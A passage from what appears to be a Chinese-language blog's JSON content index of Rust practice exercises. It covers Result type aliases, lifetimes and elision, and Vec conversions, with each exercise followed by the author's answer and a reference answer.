，那毫无疑问，代码将变得特别冗长和啰嗦，对于这种情况，可以使用类型别名来解决。 例如在标准库中，就在大量使用这种方式来简化代码: io::Result. 🌟 123456789101112131415161718192021222324252627use std::num::ParseIntError;// 填空type __;// 使用上面的别名来引用原来的 `Result` 类型fn multiply(first_number_str: &amp;str, second_number_str: &amp;str) -&gt; Res&lt;i32&gt; &#123; first_number_str.parse::&lt;i32&gt;().and_then(|first_number| &#123; second_number_str.parse::&lt;i32&gt;().map(|second_number| first_number * second_number) &#125;)&#125;// 同样, 这里也使用了类型别名来简化代码fn print(result: Res&lt;i32&gt;) &#123; match result &#123; Ok(n) =&gt; println!(&quot;n is &#123;&#125;&quot;, n), Err(e) =&gt; println!(&quot;Error: &#123;&#125;&quot;, e), &#125;&#125;fn main() &#123; print(multiply(&quot;10&quot;, &quot;2&quot;)); print(multiply(&quot;t&quot;, &quot;2&quot;)); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718192021222324252627use std::num::ParseIntError;// 填空type Res&lt;T&gt; = Result&lt;T,ParseIntError&gt;;// 使用上面的别名来引用原来的 `Result` 类型fn multiply(first_number_str: &amp;str, second_number_str: &amp;str) -&gt; Res&lt;i32&gt; &#123; first_number_str.parse::&lt;i32&gt;().and_then(|first_number| &#123; second_number_str.parse::&lt;i32&gt;().map(|second_number| first_number * second_number) &#125;)&#125;// 同样, 这里也使用了类型别名来简化代码fn print(result: Res&lt;i32&gt;) &#123; match result &#123; Ok(n) =&gt; println!(&quot;n is &#123;&#125;&quot;, n), Err(e) =&gt; println!(&quot;Error: &#123;&#125;&quot;, e), &#125;&#125;fn main() &#123; print(multiply(&quot;10&quot;, &quot;2&quot;)); print(multiply(&quot;t&quot;, &quot;2&quot;)); println!(&quot;Success!&quot;)&#125; Answer 123456789101112131415161718192021222324use std::num::ParseIntError;// Define a generic alias for a `Result` with the error type `ParseIntError`.type Res&lt;T&gt; = Result&lt;T, ParseIntError&gt;;// Use the above alias to refer to our specific `Result` type.fn multiply(first_number_str: &amp;str, second_number_str: &amp;str) -&gt; Res&lt;i32&gt; &#123; first_number_str.parse::&lt;i32&gt;().and_then(|first_number| &#123; second_number_str.parse::&lt;i32&gt;().map(|second_number| first_number * second_number) &#125;)&#125;// Here, the alias again allows us to save some space.fn print(result: Res&lt;i32&gt;) &#123; match result &#123; Ok(n) =&gt; println!(&quot;n is &#123;&#125;&quot;, n), Err(e) =&gt; println!(&quot;Error: &#123;&#125;&quot;, e), &#125;&#125;fn main() &#123; print(multiply(&quot;10&quot;, &quot;2&quot;)); print(multiply(&quot;t&quot;, &quot;2&quot;));&#125; 在fn main中使用Result一个典型的 main 函数长这样: 123fn main() &#123; println!(&quot;Hello World!&quot;);&#125; 事实上 main 函数还可以返回一个 Result 类型：如果 main 函数内部发生了错误，那该错误会被返回并且打印出一条错误的 debug 信息。 12345678910111213use std::num::ParseIntError;fn main() -&gt; Result&lt;(), ParseIntError&gt; &#123; let number_str = &quot;10&quot;; let number = match number_str.parse::&lt;i32&gt;() &#123; Ok(number) =&gt; number, Err(e) =&gt; return Err(e), &#125;; println!(&quot;&#123;&#125;&quot;, number); Ok(())&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习10 认识生命周期","slug":"Rust学习-练习10-认识生命周期","date":"2023-09-12T02:08:26.000Z","updated":"2023-09-12T12:13:48.050Z","comments":true,"path":"2023/09/12/Rust学习-练习10-认识生命周期/","link":"","permalink":"http://example.com/2023/09/12/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A010-%E8%AE%A4%E8%AF%86%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"编译器通过生命周期来确保所有的借用都是合法的，典型的，一个变量在创建时生命周期随之开始，销毁时生命周期也随之结束。 生命周期的范围 🌟","text":"编译器通过生命周期来确保所有的借用都是合法的，典型的，一个变量在创建时生命周期随之开始，销毁时生命周期也随之结束。 生命周期的范围 🌟 123456789101112131415161718/* 为 `i` 和 `borrow2` 标注合适的生命周期范围 */// `i` 拥有最长的生命周期，因为它的作用域完整的包含了 `borrow1` 和 `borrow2` 。// 而 `borrow1` 和 `borrow2` 的生命周期并无关联，因为它们的作用域没有重叠fn main() &#123; let i = 3; &#123; let borrow1 = &amp;i; // `borrow1` 生命周期开始. ──┐ // │ println!(&quot;borrow1: &#123;&#125;&quot;, borrow1); // │ &#125; // `borrow1` 生命周期结束. ──────────────────────────────────┘ &#123; let borrow2 = &amp;i; println!(&quot;borrow2: &#123;&#125;&quot;, borrow2); &#125; &#125; My Answer 直接参考答案 Answer 1234567891011121314151617fn main() &#123; let i = 3; // Lifetime for `i` starts. ────────────────┐ // │ &#123; // │ let borrow1 = &amp;i; // `borrow1` lifetime starts. ──┐│ // ││ println!(&quot;borrow1: &#123;&#125;&quot;, borrow1); // ││ &#125; // `borrow1 ends. ──────────────────────────────────┘│ // │ // │ &#123; // │ let borrow2 = &amp;i; // `borrow2` lifetime starts. ──┐│ // ││ println!(&quot;borrow2: &#123;&#125;&quot;, borrow2); // ││ &#125; // `borrow2` ends. ─────────────────────────────────┘│ // │&#125; // Lifetime ends. ─────────────────────────────────────┘ 🌟🌟 示例 1234567891011#![allow(unused)]fn main() &#123;&#123; let x = 5; // ----------+-- &#x27;b // | let r = &amp;x; // --+-- &#x27;a | // | | println!(&quot;r: &#123;&#125;&quot;, r); // | | // --+ |&#125; // ----------+&#125; 1234567891011121314/* 像上面的示例一样，为 `r` 和 `x` 标准生命周期，然后从生命周期的角度. */fn main() &#123; &#123; let r; // ---------+-- &#x27;a // | &#123; // | let x = 5; // -+-- &#x27;b | r = &amp;x; // | | &#125; // -+ | // | println!(&quot;r: &#123;&#125;&quot;, r); // | &#125; // ---------+&#125; 生命周期标注Rust 的借用检查器使用显式的生命周期标注来确定一个引用的合法范围。但是对于用户来说，我们在大多数场景下，都无需手动去标注生命周期，原因是编译器会在某些情况下自动应用生命周期消除规则。 在了解编译器使用哪些规则帮我们消除生命周期之前，首先还是需要知道该如何手动标记生命周期。 函数大家先忽略生命周期消除规则，让我们看看，函数签名中的生命周期有哪些限制: 需要为每个引用标注上合适的生命周期 返回值中的引用，它的生命周期要么跟某个引用参数相同，要么是 &#39;static 示例 1234567891011121314151617181920212223242526272829303132// 引用参数中的生命周期 &#x27;a 至少要跟函数活得一样久fn print_one&lt;&#x27;a&gt;(x: &amp;&#x27;a i32) &#123; println!(&quot;`print_one`: x is &#123;&#125;&quot;, x);&#125;// 可变引用依然需要标准生命周期fn add_one&lt;&#x27;a&gt;(x: &amp;&#x27;a mut i32) &#123; *x += 1;&#125;// 下面代码中，每个参数都拥有自己独立的生命周期，事实上，这个例子足够简单，因此它们应该被标记上相同的生命周期 `&#x27;a`，但是对于复杂的例子而言，独立的生命周期标注是可能存在的fn print_multi&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, y: &amp;&#x27;b i32) &#123; println!(&quot;`print_multi`: x is &#123;&#125;, y is &#123;&#125;&quot;, x, y);&#125;// 返回一个通过参数传入的引用是很常见的，但是这种情况下需要标注上正确的生命周期fn pass_x&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, _: &amp;&#x27;b i32) -&gt; &amp;&#x27;a i32 &#123; x &#125;fn main() &#123; let x = 7; let y = 9; print_one(&amp;x); print_multi(&amp;x, &amp;y); let z = pass_x(&amp;x, &amp;y); print_one(z); let mut t = 3; add_one(&amp;mut t); print_one(&amp;t);&#125; 🌟 12345678910/* 添加合适的生命周期标注，让下面的代码工作 */fn longest(x: &amp;str, y: &amp;str) -&gt; &amp;str &#123; if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125;fn main() &#123;&#125; My Answer 12345678910/* 添加合适的生命周期标注，让下面的代码工作 */fn longest&lt;&#x27;a&gt;(x: &amp;&#x27;a str, y: &amp;&#x27;a str) -&gt; &amp;&#x27;a str &#123; if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125;fn main() &#123;&#125; Answer 123456789fn longest&lt;&#x27;a&gt;(x: &amp;&#x27;a str, y: &amp;&#x27;a str) -&gt; &amp;&#x27;a str &#123; if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125;fn main() &#123;&#125; 🌟🌟🌟 1234567/* 使用三种方法修复下面的错误 */fn invalid_output&lt;&#x27;a&gt;() -&gt; &amp;&#x27;a String &#123; &amp;String::from(&quot;foo&quot;) &#125;fn main() &#123;&#125; My Answer 1234567/* 使用三种方法修复下面的错误 */fn invalid_output() -&gt; String &#123; String::from(&quot;foo&quot;) &#125;fn main() &#123;&#125; 1234567/* 使用三种方法修复下面的错误 */fn invalid_output() -&gt; Box&lt;String&gt; &#123; Box::new(String::from(&quot;foo&quot;))&#125;fn main() &#123;&#125; Answer 1234567/* 使用三种方法修复下面的错误 */fn invalid_output() -&gt; &amp;&#x27;static str &#123; &amp;&quot;foo&quot; &#125;fn main() &#123;&#125; 12345fn invalid_output() -&gt; String &#123; String::from(&quot;foo&quot;) &#125;fn main() &#123;&#125; 12345fn invalid_output&lt;&#x27;a&gt;(s: &amp;&#x27;a String) -&gt; &amp;&#x27;a String &#123; s&#125;fn main() &#123;&#125; 🌟🌟 1234567891011121314151617181920212223242526// `print_refs` 有两个引用参数，它们的生命周期 `&#x27;a` 和 `&#x27;b` 至少得跟函数活得一样久fn print_refs&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, y: &amp;&#x27;b i32) &#123; println!(&quot;x is &#123;&#125; and y is &#123;&#125;&quot;, x, y);&#125;/* 让下面的代码工作 */fn failed_borrow&lt;&#x27;a&gt;() &#123; let _x = 12; // ERROR: `_x` 活得不够久does not live long enough let y: &amp;&#x27;a i32 = &amp;_x; // 在函数内使用 `&#x27;a` 将会报错，原因是 `&amp;_x` 的生命周期显然比 `&#x27;a` 要小 // 你不能将一个小的生命周期强转成大的&#125;fn main() &#123; let (four, nine) = (4, 9); print_refs(&amp;four, &amp;nine); // 这里，four 和 nice 的生命周期必须要比函数 print_refs 长 failed_borrow(); // `failed_borrow` 没有传入任何引用去限制生命周期 `&#x27;a`，因此，此时的 `&#x27;a` 生命周期是没有任何限制的，它默认是 `&#x27;static`&#125; My Answer 1234567891011121314151617181920212223242526// `print_refs` 有两个引用参数，它们的生命周期 `&#x27;a` 和 `&#x27;b` 至少得跟函数活得一样久fn print_refs&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, y: &amp;&#x27;b i32) &#123; println!(&quot;x is &#123;&#125; and y is &#123;&#125;&quot;, x, y);&#125;/* 让下面的代码工作 */fn failed_borrow&lt;&#x27;a&gt;() &#123; let _x = 12; // ERROR: `_x` 活得不够久does not live long enough let y: &amp;i32 = &amp;_x; // 在函数内使用 `&#x27;a` 将会报错，原因是 `&amp;_x` 的生命周期显然比 `&#x27;a` 要小 // 你不能将一个小的生命周期强转成大的&#125;fn main() &#123; let (four, nine) = (4, 9); print_refs(&amp;four, &amp;nine); // 这里，four 和 nice 的生命周期必须要比函数 print_refs 长 failed_borrow(); // `failed_borrow` 没有传入任何引用去限制生命周期 `&#x27;a`，因此，此时的 `&#x27;a` 生命周期是没有任何限制的，它默认是 `&#x27;static`&#125; Answer 123456789101112131415161718fn print_refs&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a i32, y: &amp;&#x27;b i32) &#123; println!(&quot;x is &#123;&#125; and y is &#123;&#125;&quot;, x, y);&#125;/* Make it work */fn failed_borrow&lt;&#x27;a&gt;() &#123; let _x = 12; let y: &amp;i32 = &amp;_x;&#125;fn main() &#123; let (four, nine) = (4, 9); print_refs(&amp;four, &amp;nine); failed_borrow();&#125; struct 🌟 123456789101112131415161718192021222324252627282930313233/* 增加合适的生命周期标准，让代码工作 */// `i32` 的引用必须比 `Borrowed` 活得更久#[derive(Debug)]struct Borrowed(&amp;i32);// 类似的，下面两个引用也必须比结构体 `NamedBorrowed` 活得更久#[derive(Debug)]struct NamedBorrowed &#123; x: &amp;i32, y: &amp;i32,&#125;#[derive(Debug)]enum Either &#123; Num(i32), Ref(&amp;i32),&#125;fn main() &#123; let x = 18; let y = 15; let single = Borrowed(&amp;x); let double = NamedBorrowed &#123; x: &amp;x, y: &amp;y &#125;; let reference = Either::Ref(&amp;x); let number = Either::Num(y); println!(&quot;x is borrowed in &#123;:?&#125;&quot;, single); println!(&quot;x and y are borrowed in &#123;:?&#125;&quot;, double); println!(&quot;x is borrowed in &#123;:?&#125;&quot;, reference); println!(&quot;y is *not* borrowed in &#123;:?&#125;&quot;, number);&#125; My Answer 123456789101112131415161718192021222324252627282930313233/* 增加合适的生命周期标准，让代码工作 */// `i32` 的引用必须比 `Borrowed` 活得更久#[derive(Debug)]struct Borrowed&lt;&#x27;a&gt;(&amp;&#x27;a i32);// 类似的，下面两个引用也必须比结构体 `NamedBorrowed` 活得更久#[derive(Debug)]struct NamedBorrowed&lt;&#x27;a&gt;&#123; x: &amp;&#x27;a i32, y: &amp;&#x27;a i32,&#125;#[derive(Debug)]enum Either&lt;&#x27;a&gt;&#123; Num(i32), Ref(&amp;&#x27;a i32),&#125;fn main() &#123; let x = 18; let y = 15; let single = Borrowed(&amp;x); let double = NamedBorrowed &#123; x: &amp;x, y: &amp;y &#125;; let reference = Either::Ref(&amp;x); let number = Either::Num(y); println!(&quot;x is borrowed in &#123;:?&#125;&quot;, single); println!(&quot;x and y are borrowed in &#123;:?&#125;&quot;, double); println!(&quot;x is borrowed in &#123;:?&#125;&quot;, reference); println!(&quot;y is *not* borrowed in &#123;:?&#125;&quot;, number);&#125; Answer 123456789101112131415161718192021222324252627282930313233// A type `Borrowed` which houses a reference to an// `i32`. The reference to `i32` must outlive `Borrowed`.#[derive(Debug)]struct Borrowed&lt;&#x27;a&gt;(&amp;&#x27;a i32);// Similarly, both references here must outlive this structure.#[derive(Debug)]struct NamedBorrowed&lt;&#x27;a&gt; &#123; x: &amp;&#x27;a i32, y: &amp;&#x27;a i32,&#125;// An enum which is either an `i32` or a reference to one.#[derive(Debug)]enum Either&lt;&#x27;a&gt; &#123; Num(i32), Ref(&amp;&#x27;a i32),&#125;fn main() &#123; let x = 18; let y = 15; let single = Borrowed(&amp;x); let double = NamedBorrowed &#123; x: &amp;x, y: &amp;y &#125;; let reference = Either::Ref(&amp;x); let number = Either::Num(y); println!(&quot;x is borrowed in &#123;:?&#125;&quot;, single); println!(&quot;x and y are borrowed in &#123;:?&#125;&quot;, double); println!(&quot;x is borrowed in &#123;:?&#125;&quot;, reference); println!(&quot;y is *not* borrowed in &#123;:?&#125;&quot;, number);&#125; 🌟🌟 12345678910111213141516171819202122232425/* 让代码工作 */#[derive(Debug)]struct NoCopyType &#123;&#125;#[derive(Debug)]struct Example&lt;&#x27;a, &#x27;b&gt; &#123; a: &amp;&#x27;a u32, b: &amp;&#x27;b NoCopyType&#125;fn main()&#123; let var_a = 35; let example: Example; &#123; let var_b = NoCopyType &#123;&#125;; /* 修复错误 */ example = Example &#123; a: &amp;var_a, b: &amp;var_b &#125;; &#125; println!(&quot;(Success!) &#123;:?&#125;&quot;, example);&#125; My Answer 12345678910111213141516171819202122232425/* 让代码工作 */#[derive(Debug)]struct NoCopyType &#123;&#125;#[derive(Debug)]struct Example&lt;&#x27;a, &#x27;b&gt; &#123; a: &amp;&#x27;a u32, b: &amp;&#x27;b NoCopyType,&#125;fn main() &#123; let var_a = 35; let example: Example; let var_b = NoCopyType &#123;&#125;; /* 修复错误 */ example = Example &#123; a: &amp;var_a, b: &amp;var_b, &#125;; println!(&quot;(Success!) &#123;:?&#125;&quot;, example);&#125; Answer 1234567891011121314151617181920212223242526272829/* Make it work */#[derive(Debug)]struct NoCopyType &#123;&#125;#[derive(Debug)]struct Example&lt;&#x27;a, &#x27;b&gt; &#123; a: &amp;&#x27;a u32, b: &amp;&#x27;b NoCopyType,&#125;fn main() &#123; /* &#x27;a tied to fn-main stackframe */ let var_a = 35; let example: Example; // &#123; /* lifetime &#x27;b tied to new stackframe/scope */ let var_b = NoCopyType &#123;&#125;; /* fixme */ example = Example &#123; a: &amp;var_a, b: &amp;var_b, &#125;; // &#125; println!(&quot;(Success!) &#123;:?&#125;&quot;, example);&#125; 🌟🌟 123456789101112131415161718192021#[derive(Debug)]struct NoCopyType &#123;&#125;#[derive(Debug)]#[allow(dead_code)]struct Example&lt;&#x27;a, &#x27;b&gt; &#123; a: &amp;&#x27;a u32, b: &amp;&#x27;b NoCopyType&#125;/* 修复函数的签名 */fn fix_me(foo: &amp;Example) -&gt; &amp;NoCopyType&#123; foo.b &#125;fn main()&#123; let no_copy = NoCopyType &#123;&#125;; let example = Example &#123; a: &amp;1, b: &amp;no_copy &#125;; fix_me(&amp;example); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718192021#[derive(Debug)]struct NoCopyType &#123;&#125;#[derive(Debug)]#[allow(dead_code)]struct Example&lt;&#x27;a, &#x27;b&gt; &#123; a: &amp;&#x27;a u32, b: &amp;&#x27;b NoCopyType&#125;/* 修复函数的签名 */fn fix_me&lt;&#x27;a&gt;(foo: &amp;&#x27;a Example) -&gt; &amp;&#x27;a NoCopyType&#123; foo.b &#125;fn main()&#123; let no_copy = NoCopyType &#123;&#125;; let example = Example &#123; a: &amp;1, b: &amp;no_copy &#125;; fix_me(&amp;example); println!(&quot;Success!&quot;)&#125; Answer 123456789101112131415161718192021#[derive(Debug)]struct NoCopyType &#123;&#125;#[derive(Debug)]#[allow(dead_code)]struct Example&lt;&#x27;a, &#x27;b&gt; &#123; a: &amp;&#x27;a u32, b: &amp;&#x27;b NoCopyType&#125;/* Fix function signature */fn fix_me&lt;&#x27;b&gt;(foo: &amp;Example&lt;&#x27;_, &#x27;b&gt;) -&gt; &amp;&#x27;b NoCopyType&#123; foo.b &#125;fn main()&#123; let no_copy = NoCopyType &#123;&#125;; let example = Example &#123; a: &amp;1, b: &amp;no_copy &#125;; fix_me(&amp;example); print!(&quot;Success!&quot;)&#125; 方法方法的生命周期标注跟函数类似。 示例 123456789101112131415struct Owner(i32);impl Owner &#123; fn add_one&lt;&#x27;a&gt;(&amp;&#x27;a mut self) &#123; self.0 += 1; &#125; fn print&lt;&#x27;a&gt;(&amp;&#x27;a self) &#123; println!(&quot;`print`: &#123;&#125;&quot;, self.0); &#125;&#125;fn main() &#123; let mut owner = Owner(18); owner.add_one(); owner.print();&#125; 🌟🌟 123456789101112/* 添加合适的生命周期让下面代码工作 */struct ImportantExcerpt &#123; part: &amp;str,&#125;impl ImportantExcerpt &#123; fn level(&amp;&#x27;a self) -&gt; i32 &#123; 3 &#125;&#125;fn main() &#123;&#125; My Answer 123456789101112/* 添加合适的生命周期让下面代码工作 */struct ImportantExcerpt&lt;&#x27;a&gt; &#123; part: &amp;&#x27;a str,&#125;impl ImportantExcerpt&lt;&#x27;_&gt; &#123; fn level&lt;&#x27;a&gt;(&amp;&#x27;a self) -&gt; i32 &#123; 3 &#125;&#125;fn main() &#123;&#125; Answer 1234567891011struct ImportantExcerpt&lt;&#x27;a&gt; &#123; part: &amp;&#x27;a str,&#125;impl&lt;&#x27;a&gt; ImportantExcerpt&lt;&#x27;a&gt; &#123; fn level(&amp;&#x27;a self) -&gt; i32 &#123; 3 &#125;&#125;fn main() &#123;&#125; 生命周期消除（Elision)有一些生命周期的标注方式很常见，因此编译器提供了一些规则，可以让我们在一些场景下无需去标注生命周期，既节省了敲击键盘的繁琐，又能提升可读性。 这种规则被称为生命周期消除规则( Elision )，该规则之所以存在，仅仅是因为这些场景太通用了，为了方便用户而已。事实上对于借用检查器而言，该有的生命周期一个都不能少，只不过对于用户而言，可以省去一些。 🌟🌟 1234567891011121314151617181920212223242526272829303132/* 移除所有可以消除的生命周期标注 */fn nput&lt;&#x27;a&gt;(x: &amp;&#x27;a i32) &#123; println!(&quot;`annotated_input`: &#123;&#125;&quot;, x);&#125;fn pass&lt;&#x27;a&gt;(x: &amp;&#x27;a i32) -&gt; &amp;&#x27;a i32 &#123; x &#125;fn longest&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a str, y: &amp;&#x27;b str) -&gt; &amp;&#x27;a str &#123; x&#125;struct Owner(i32);impl Owner &#123; fn add_one&lt;&#x27;a&gt;(&amp;&#x27;a mut self) &#123; self.0 += 1; &#125; fn print&lt;&#x27;a&gt;(&amp;&#x27;a self) &#123; println!(&quot;`print`: &#123;&#125;&quot;, self.0); &#125;&#125;struct Person&lt;&#x27;a&gt; &#123; age: u8, name: &amp;&#x27;a str,&#125;enum Either&lt;&#x27;a&gt; &#123; Num(i32), Ref(&amp;&#x27;a i32),&#125;fn main() &#123;&#125; My Answer 1234567891011121314151617181920212223242526272829303132/* 移除所有可以消除的生命周期标注 */fn nput(x: &amp; i32) &#123; println!(&quot;`annotated_input`: &#123;&#125;&quot;, x);&#125;fn pass(x: &amp; i32) -&gt; &amp; i32 &#123; x &#125;fn longest&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a str, y: &amp;&#x27;b str) -&gt; &amp;&#x27;a str &#123; x&#125;struct Owner(i32);impl Owner &#123; fn add_one(&amp; mut self) &#123; self.0 += 1; &#125; fn print(&amp; self) &#123; println!(&quot;`print`: &#123;&#125;&quot;, self.0); &#125;&#125;struct Person&lt;&#x27;a&gt; &#123; age: u8, name: &amp;&#x27;a str,&#125;enum Either&lt;&#x27;a&gt; &#123; Num(i32), Ref(&amp;&#x27;a i32),&#125;fn main() &#123;&#125; Answer 12345678910111213141516171819202122232425262728293031fn nput(x: &amp;i32) &#123; println!(&quot;`annotated_input`: &#123;&#125;&quot;, x);&#125;fn pass(x: &amp;i32) -&gt; &amp;i32 &#123; x &#125;fn longest&lt;&#x27;a, &#x27;b&gt;(x: &amp;&#x27;a str, y: &amp;&#x27;b str) -&gt; &amp;&#x27;a str &#123; x&#125;struct Owner(i32);impl Owner &#123; // Annotate lifetimes as in a standalone function. fn add_one(&amp;mut self) &#123; self.0 += 1; &#125; fn print(&amp;self) &#123; println!(&quot;`print`: &#123;&#125;&quot;, self.0); &#125;&#125;struct Person&lt;&#x27;a&gt; &#123; age: u8, name: &amp;&#x27;a str,&#125;enum Either&lt;&#x27;a&gt; &#123; Num(i32), Ref(&amp;&#x27;a i32),&#125;fn main() &#123;&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习9 集合类型","slug":"Rust学习-练习9-集合类型","date":"2023-09-11T12:57:21.000Z","updated":"2023-09-12T01:19:14.438Z","comments":true,"path":"2023/09/11/Rust学习-练习9-集合类型/","link":"","permalink":"http://example.com/2023/09/11/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A09-%E9%9B%86%E5%90%88%E7%B1%BB%E5%9E%8B/","excerpt":"动态数组Vector相比 [T; N] 形式的数组， Vector 最大的特点就是可以动态调整长度。 基本操作","text":"动态数组Vector相比 [T; N] 形式的数组， Vector 最大的特点就是可以动态调整长度。 基本操作 🌟🌟🌟 123456789101112131415161718192021222324fn main() &#123; let arr: [u8; 3] = [1, 2, 3]; let v = Vec::from(arr); is_vec(v); let v = vec![1, 2, 3]; is_vec(v); // vec!(..) 和 vec![..] 是同样的宏，宏可以使用 []、()、&#123;&#125;三种形式，因此... let v = vec!(1, 2, 3); is_vec(v); // ...在下面的代码中, v 是 Vec&lt;[u8; 3]&gt; , 而不是 Vec&lt;u8&gt; // 使用 Vec::new 和 `for` 来重写下面这段代码 let v1 = vec!(arr); is_vec(v1); assert_eq!(v, v1); println!(&quot;Success!&quot;)&#125;fn is_vec(v: Vec&lt;u8&gt;) &#123;&#125; My Answer 123456789101112131415161718192021222324252627fn main() &#123; let arr: [u8; 3] = [1, 2, 3]; let v = Vec::from(arr); is_vec(v.clone()); let v = vec![1, 2, 3]; is_vec(v.clone()); // vec!(..) 和 vec![..] 是同样的宏，宏可以使用 []、()、&#123;&#125;三种形式，因此... let v = vec!(1, 2, 3); is_vec(v.clone()); // ...在下面的代码中, v 是 Vec&lt;[u8; 3]&gt; , 而不是 Vec&lt;u8&gt; // 使用 Vec::new 和 `for` 来重写下面这段代码 let mut v1 = Vec::new(); for i in &amp;arr&#123; v1.push(*i); &#125; is_vec(v1.clone()); assert_eq!(v, v1); println!(&quot;Success!&quot;)&#125;fn is_vec(v: Vec&lt;u8&gt;) &#123;&#125; Answer 123456789101112131415161718192021222324fn main() &#123; let arr: [u8; 3] = [1, 2, 3]; let v = Vec::from(arr); is_vec(v); let v = vec![1, 2, 3]; is_vec(v); // vec!(..) 和 vec![..] 是同样的宏，宏可以使用 []、()、&#123;&#125;三种形式，因此... let v = vec!(1, 2, 3); is_vec(v); // ...在下面的代码中, v 是 Vec&lt;[u8; 3]&gt; , 而不是 Vec&lt;u8&gt; // 使用 Vec::new 和 `for` 来重写下面这段代码 let v1 = vec!(arr); is_vec(v1); assert_eq!(v, v1); println!(&quot;Success!&quot;)&#125;fn is_vec(v: Vec&lt;u8&gt;) &#123;&#125; 🌟🌟 Vec 可以使用 extend 方法进行扩展 12345678910111213// 填空fn main() &#123; let mut v1 = Vec::from([1, 2, 4]); v1.pop(); v1.push(3); let mut v2 = Vec::new(); v2.__; assert_eq!(v1, v2); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213// 填空fn main() &#123; let mut v1 = Vec::from([1, 2, 4]); v1.pop(); v1.push(3); let mut v2 = Vec::new(); v2.extend([1,2,3]); assert_eq!(v1, v2); println!(&quot;Success!&quot;)&#125; Answer 123456789101112fn main() &#123; let mut v1 = Vec::from([1, 2, 4]); v1.pop(); v1.push(3); let mut v2 = Vec::new(); v2.extend([1, 2, 3]); assert_eq!(format!(&quot;&#123;:?&#125;&quot;,v1), format!(&quot;&#123;:?&#125;&quot;,v2)); println!(&quot;Success!&quot;)&#125; 将X类型转换（From&#x2F;Into特征）成Vec只要为 Vec 实现了 From&lt;T&gt; 特征，那么 T 就可以被转换成 Vec。 🌟🌟🌟 1234567891011121314151617181920212223242526272829// 填空fn main() &#123; // array -&gt; Vec // impl From&lt;[T; N]&gt; for Vec let arr = [1, 2, 3]; let v1 = __(arr); let v2: Vec&lt;i32&gt; = arr.__(); assert_eq!(v1, v2); // String -&gt; Vec // impl From&lt;String&gt; for Vec let s = &quot;hello&quot;.to_string(); let v1: Vec&lt;u8&gt; = s.__(); let s = &quot;hello&quot;.to_string(); let v2 = s.into_bytes(); assert_eq!(v1, v2); // impl&lt;&#x27;_&gt; From&lt;&amp;&#x27;_ str&gt; for Vec let s = &quot;hello&quot;; let v3 = Vec::__(s); assert_eq!(v2, v3); // 迭代器 Iterators 可以通过 collect 变成 Vec let v4: Vec&lt;i32&gt; = [0; 10].into_iter().collect(); assert_eq!(v4, vec![0; 10]); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819202122232425262728293031// 填空 fn main() &#123; // array -&gt; Vec // impl From&lt;[T; N]&gt; for Vec let arr = [1, 2, 3]; let v1 = Vec::from(arr); let v2: Vec&lt;i32&gt; = arr.to_vec(); assert_eq!(v1, v2); // String -&gt; Vec // impl From&lt;String&gt; for Vec let s = &quot;hello&quot;.to_string(); let v1: Vec&lt;u8&gt; = Vec::from(s); let s = &quot;hello&quot;.to_string(); let v2 = s.into_bytes(); assert_eq!(v1, v2); // impl&lt;&#x27;_&gt; From&lt;&amp;&#x27;_ str&gt; for Vec let s = &quot;hello&quot;; let v3 = Vec::from(s); assert_eq!(v2, v3); // 迭代器 Iterators 可以通过 collect 变成 Vec let v4: Vec&lt;i32&gt; = [0; 10].into_iter().collect(); assert_eq!(v4, vec![0; 10]); println!(&quot;Success!&quot;) &#125; Answer 1234567891011121314151617181920212223fn main() &#123; // array -&gt; Vec let arr = [1, 2, 3]; let v1 = Vec::from(arr); let v2: Vec&lt;i32&gt; = arr.into(); assert_eq!(v1, v2); // String -&gt; Vec let s = &quot;hello&quot;.to_string(); let v1: Vec&lt;u8&gt; = s.into(); let s = &quot;hello&quot;.to_string(); let v2 = s.into_bytes(); assert_eq!(v1, v2); let s = &quot;hello&quot;; let v3 = Vec::from(s); assert_eq!(v2, v3); println!(&quot;Success!&quot;) &#125; 索引 🌟🌟🌟 123456789101112131415// 修复错误并实现缺失的代码fn main() &#123; let mut v = Vec::from([1, 2, 3]); for i in 0..5 &#123; println!(&quot;&#123;:?&#125;&quot;, v[i]) &#125; for i in 0..5 &#123; // 实现这里的代码... &#125; assert_eq!(v, vec![2, 3, 4, 5, 6]); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819// 修复错误并实现缺失的代码fn main() 